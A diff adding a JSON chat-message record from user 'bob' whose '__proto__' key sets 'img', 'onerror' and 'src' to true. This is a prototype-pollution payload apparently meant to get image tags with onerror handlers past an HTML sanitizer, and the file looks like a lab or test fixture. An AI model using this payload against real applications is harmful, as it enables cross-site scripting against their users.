@@ -1,0 +1,14 @@
+{
+  "0": {
+    "id": 0,
+    "senderId": "1",
+    "senderUsername": "bob",
+    "dateSent": "2025-03-11T09:28:00",
+    "message": "Prototype Pollution",
+    "__proto__": {
+      "img": true,
+      "onerror": true,
+      "src": true
+    }
+  }
+}
